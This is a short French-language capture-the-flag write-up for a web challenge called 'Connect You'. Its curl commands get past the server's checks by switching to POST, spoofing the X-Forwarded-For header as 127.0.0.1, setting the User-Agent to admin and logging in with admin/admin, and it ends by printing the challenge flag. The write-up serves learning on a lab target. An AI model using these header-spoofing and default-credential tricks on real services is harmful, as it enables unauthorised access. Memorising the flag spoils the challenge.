# Connect You 🌐
```
70 pts
```

## Description
```
[FR]
On ne sait rien d'autres, mais on doit se connecter en tant qu'admin pour récupérer un ancien trésor.

[EN]
We don't know anything else, but we have to log in as admin to recover an ancient treasure.
Author: 5c0r7

http://ctf.hackerlab.bj:1022
```
> Lorsque nous nous rendons sur le lien du challenge, un message apparaît disant "I don't like this REQUEST_METHOD". Nous avons donc décidé de modifier la méthode de la requête.
 ```curl -X POST http://ctf.hackerlab.bj:1022/```

> Après avoir changé la méthode de la requête, un autre message s'affiche "I don't know your IP address". Nous avons utilisé l'en-tête HTTP "X-Forwarded-For", qui permet d'identifier l'adresse IP d'origine d'un client.
> ```curl -X POST http://ctf.hackerlab.bj:1022/ -H 'X-Forwarded-For:127.0.0.1'```

> Ensuite, nous recevons le message "I only accept admin user-agent". Nous avons alors modifié le user-agent. ```curl -X POST http://ctf.hackerlab.bj:1022/ -H 'X-Forwarded-For:127.0.0.1' -H 'User-Agent:admin'```
 
> 😩 Malgré la modification de l'user-agent, nous obtenons toujours un message disant "I don't see any username or password to perform authentication", qui demande un nom d'utilisateur et un mot de passe.

> Après avoir ajouté ces informations, nous obtenons le flag! 😮‍💨 ```curl -X POST http://ctf.hackerlab.bj:1022/ -H 'X-Forwarded-For:127.0.0.1' -H 'User-Agent:admin' -d 'username=admin&password=admin'```

# Flag
```Congratz, Here is your flag: CTF_S0mE_b@s!c_bAs3d_4uThen7iF1(at!0n_hehehehe```
